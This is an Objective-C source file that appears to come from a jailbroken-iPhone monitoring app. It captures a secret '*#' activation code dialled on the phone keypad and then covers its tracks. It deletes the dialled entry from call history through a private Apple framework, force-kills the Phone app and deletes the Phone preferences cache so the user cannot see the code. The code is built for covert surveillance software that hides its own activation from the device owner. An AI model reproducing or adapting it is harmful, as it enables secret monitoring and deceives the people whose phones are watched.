//
//  ActivationCodeCaptureManager.m
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 11/23/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#import <dlfcn.h>
#import <objc/runtime.h>

#import "ActivationCodeCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"
#import "CallHistoryDAO.h"
#import "NoteACCapture.h"

#import "CTCall.h"

#import "CHManager.h"
#import "CHRecentCall.h"

@interface ActivationCodeCaptureManager (private)
- (void) onActivationCodeReceived: (id) aNotification;
- (void) scanAndDeleteActivationCodeFromCallHistory;
- (void) deleteActivationCodeFromCallHistory: (NSString*) aActivationCode;
- (void) deleteActivationCodeFromMobilePhoneCache;
- (void) clearActivationInfoAndNotifyDelegate;
- (void) fireWithoutSim: (NSTimer *) aTimer;
- (void) clearActivationInfoAndNotifyDelegateWithDialNumber: (NSString *) aDialNumber;
@end

@implementation ActivationCodeCaptureManager

@synthesize mDialNumber;
@synthesize mActivationCodeDialing;

- (id) initWithDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mNoteACCapture = [[NoteACCapture alloc] initWithDelegate:aDelegate];
		mDelegate = aDelegate;
	}
	return (self);
}

- (id) initWithTelephonyNotification: (id <TelephonyNotificationManager>) aManager andDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate {
    self = [super init];
    if (self != nil) {
		mNoteACCapture = [[NoteACCapture alloc] initWithDelegate:aDelegate];
        mTelephonyNotificationManager = aManager;
		mDelegate = aDelegate;
    }
    return self;
}

- (void) startCaptureActivationCode {
	if (!mListening) {
		[self scanAndDeleteActivationCodeFromCallHistory];
		system("killall MobilePhone");
		[mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(onActivationCodeReceived:) forNotification:KCALLSTATUSCHANGENOTIFICATION];
		[mNoteACCapture start];
		mListening = TRUE;
	}
}

- (void) stopCaptureActivationCode {
	[mTelephonyNotificationManager removeListner:self];
	[mNoteACCapture stop];
	mListening = FALSE;
}

- (void) onActivationCodeReceived: (id) aNotification {
	NSNotification* notification = aNotification;
	NSDictionary* dictionary = [notification userInfo];
	if (dictionary) {
		DLog(@"dictionary: %@", dictionary);
		NSInteger callStatus = [[dictionary objectForKey:@"kCTCallStatus"] intValue];
		if (callStatus == CALL_NOTIFICATION_STATUS_OUTGOING) {
			CTCall* call = (CTCall*)[dictionary objectForKey:@"kCTCall"];
			if (call) {
				NSString* dialNumber = CTCallCopyAddress(nil, call);
				if (dialNumber && [dialNumber length] >= 3) {
					DLog(@"dialNumber: %@", dialNumber)
					if ([dialNumber hasPrefix:@"*#"]) {
						NSString* activationCode = [dialNumber substringWithRange:NSMakeRange(2, [dialNumber length] - 2)];
						NSRange starSignRange = [activationCode rangeOfString:@"*"];
						NSRange numberSignRange = [activationCode rangeOfString:@"#"];
						if (numberSignRange.length == 0 && starSignRange.length == 0) {
							DLog(@"Activation code: %@", activationCode)
							[self setMActivationCodeDialing:TRUE];
							[self setMDialNumber:[NSString stringWithString:dialNumber]];
						}
					}
				}
				[dialNumber release];
			}
		} else if (callStatus == CALL_NOTIFICATION_STATUS_TERMINATED) {
			if ([self mActivationCodeDialing]) {
				[self setMActivationCodeDialing:FALSE];
				NSString *ac = [[self mDialNumber] substringWithRange:NSMakeRange(2, [mDialNumber length] - 2)];
				DLog (@"Activation code in phone keypad: %@", ac);
				DLog (@"Activation code: %@", [self mAC]);
				if ([[self mAC] isEqualToString:ac]) {				// acitvation code                    
                    DLog(@"Delete activationcode %@ from call history (is main thread? %d)", [self mDialNumber], [NSThread isMainThread])
                    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
                        [self clearActivationInfoAndNotifyDelegate];
                    } else {
                        [NSTimer scheduledTimerWithTimeInterval:3 target:self selector:@selector(clearActivationInfoAndNotifyDelegate) userInfo:nil repeats:NO];
                    }
				}
			} else {
                /*
                 On iPhone 5 iOS 7.0.4, when there is no SIM user dial *#900900900,
                 call status will only give TERMINATED not DIALING -> TERMINATED
                 */
                
                CTCall* call = (CTCall*)[dictionary objectForKey:@"kCTCall"];
                DLog(@"call object %@", call)
            
                if (call != nil && CTCallIsOutgoing(call)) {
                    NSString *dialNumber = CTCallCopyAddress(nil, call);                    
                    DLog(@"dial number %@", dialNumber)
                   
                    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
                        [self clearActivationInfoAndNotifyDelegateWithDialNumber:dialNumber];
                    } else {
                        if (!dialNumber) {
                            DLog(@"Find dial number from notification userinfo %@", dictionary)
                            
                            // Get UUID from CTCallRef object
                            /*
                             kCTCall = "<CTCall 0x166e9b40 [0x31797460]>{status = 5, type = 0x1, subtype = 0x1, uuid = 0x166e9b20 [BD6A43C4-1164-4FB8-BC8A-3EBEE603328D], address = 0x0, externalID = -1, start = 4.3687e+08, session start = 4.3685e+08, end = 4.3687e+08}";
                             */
                            CFUUIDRef uuidRef               = CTCallCopyUUID(nil, call);    //uuid <CFUUID 0x17ecfad0> 33201725-5933-493C-8C36-886788E72C17
                            NSString *uuidString            = (NSString *) CFUUIDCreateString(NULL, uuidRef);
                            DLog(@"uuid ref %@ uuid string %@ ", uuidRef, uuidString)
                            
                            [uuidString autorelease];
                            if (uuidRef)
                                CFRelease(uuidRef);
                            
                            [NSTimer scheduledTimerWithTimeInterval:3 target:self selector:@selector(fireWithoutSim:) userInfo:uuidString repeats:NO];
                        }
                    }
                }
            }
		}
	}
}

- (void) clearActivationInfoAndNotifyDelegate {
    system("killall MobilePhone");
    
    // Delete record from Recents tab of Phone application
    [self deleteActivationCodeFromCallHistory:[self mDialNumber]];
    
    // Kill Phone application
    system("killall MobilePhone");

    // Clear the dialed activation code from keypad cache
    [self deleteActivationCodeFromMobilePhoneCache];
    
    // Notify delegate
    NSString *ac = [[self mDialNumber] substringWithRange:NSMakeRange(2, [mDialNumber length] - 2)];
    if ([mDelegate respondsToSelector:@selector(activationCodeDidReceived:)]) {
        [mDelegate performSelector:@selector(activationCodeDidReceived:) withObject:self withObject:ac];
    }
    
    [self setMDialNumber:nil];
}

- (void) fireWithoutSim: (NSTimer *) aTimer {
    NSString *dialNumber            = nil;
    NSString *uuidString            = [aTimer userInfo];
    
    // Query tel number using UUID
    CallHistoryDAO *callHistoryDAO  = [[CallHistoryDAO alloc] init] ;
    dialNumber                      = [callHistoryDAO telNumberForUUID:uuidString];
    [callHistoryDAO release];

    // Clear activation code and notify delegate
    [self clearActivationInfoAndNotifyDelegateWithDialNumber:dialNumber];
}

- (void) clearActivationInfoAndNotifyDelegateWithDialNumber: (NSString *) aDialNumber {
    
    if ([aDialNumber hasPrefix:@"*#"]) {
        
        DLog(@"Outgoing call (*#) without OUTGOING call status, %@", aDialNumber);
        
        NSString *ac    = [aDialNumber substringFromIndex:2];
        
        if ([ac isEqualToString:[self mAC]]) {
            DLog(@"Clear activation code")
            
            [self deleteActivationCodeFromCallHistory:aDialNumber];
            
            system("killall MobilePhone");
            
            [self deleteActivationCodeFromMobilePhoneCache];
            
            if ([mDelegate respondsToSelector:@selector(activationCodeDidReceived:)]) {
                [mDelegate performSelector:@selector(activationCodeDidReceived:)
                                withObject:self
                                withObject:ac];
            }
        }
        [self setMDialNumber:nil];
    }
    
}

- (void) scanAndDeleteActivationCodeFromCallHistory {
	CallHistoryDAO* dao = [[CallHistoryDAO alloc] init];
	[dao scanAndDeleteAllActivationCode];
	[dao release];
    
    if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
        void *handle = dlopen("/System/Library/PrivateFrameworks/CallHistory.framework/CallHistory", RTLD_NOW);
        Class $CHManager = objc_getClass("CHManager");
        CHManager *manager = [[$CHManager alloc] init];
        NSArray *recentCalls = [manager recentCallsWithPredicate:[NSPredicate predicateWithFormat:@"callerId BEGINSWITH[cd] '*#'"]];
        DLog(@"recentCalls, %@", recentCalls);
        for (CHRecentCall *recentCall in recentCalls) {
            [manager deleteCall:recentCall];
        }
        [manager release];
        dlclose(handle);
    }
}

- (void) deleteActivationCodeFromCallHistory: (NSString*) aActivationCode {
	CallHistoryDAO* dao = [[CallHistoryDAO alloc] init];
	[dao deleteActivationCode:aActivationCode];
	[dao release];
    
    if ([[[UIDevice currentDevice] systemVersion] integerValue] >= 9) {
        void *handle = dlopen("/System/Library/PrivateFrameworks/CallHistory.framework/CallHistory", RTLD_NOW);
        Class $CHManager = objc_getClass("CHManager");
        CHManager *manager = [[$CHManager alloc] init];
        NSArray *recentCalls = [manager recentCallsWithPredicate:[NSPredicate predicateWithFormat:@"callerId like[cd] %@", aActivationCode]];
        //NSArray *recentCalls = [manager recentCalls];
        DLog(@"recentCalls, %@", recentCalls);
        DLog(@"postFetchingPredicate, %@", [manager postFetchingPredicate]);
        for (CHRecentCall *recentCall in recentCalls) {
            [manager deleteCall:recentCall];
        }
        [manager release];
        dlclose(handle);
    }
}

- (void) deleteActivationCodeFromMobilePhoneCache {
	NSString *cacheFilePath = @"/User/Library/Preferences/com.apple.mobilephone.plist";
	NSFileManager *fm = [NSFileManager defaultManager];
	if (fm && [fm fileExistsAtPath:cacheFilePath]) {
		[fm removeItemAtPath:cacheFilePath error:nil];
	}
}

#pragma mark Overide property
#pragma mark -

- (void) setMAC: (NSString *) aAC {
	[mAC release];
	mAC = [[NSString alloc] initWithString:aAC];
	[mNoteACCapture setMAC:aAC];
}

- (NSString *) mAC {
	return (mAC);
}

- (void) dealloc {
	[mDialNumber release];
	[mAC release];
	[self stopCaptureActivationCode];
	[mTelephonyNotificationManagerImpl release];
	[mNoteACCapture release];
	[super dealloc];
}

@end
